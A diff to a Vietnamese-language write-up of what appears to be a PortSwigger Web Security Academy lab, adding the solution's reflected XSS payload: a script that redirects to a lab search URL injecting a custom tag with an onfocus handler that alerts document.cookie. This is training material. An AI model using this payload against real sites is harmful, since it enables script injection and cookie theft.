@@ -364,6 +364,13 @@ Tôi gà quá nghĩ không ra, xem solution thì thấy có thêm cả #x vào c
 
 ![image](https://github.com/user-attachments/assets/1775a5da-1692-4c16-b743-253e8eae0fb4)
 
+`<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>`
+
+Payload ở solution đây
+
+![image](https://github.com/user-attachments/assets/c3fba808-32c1-4dbb-8d32-e49aa091b31a)
 
 
 
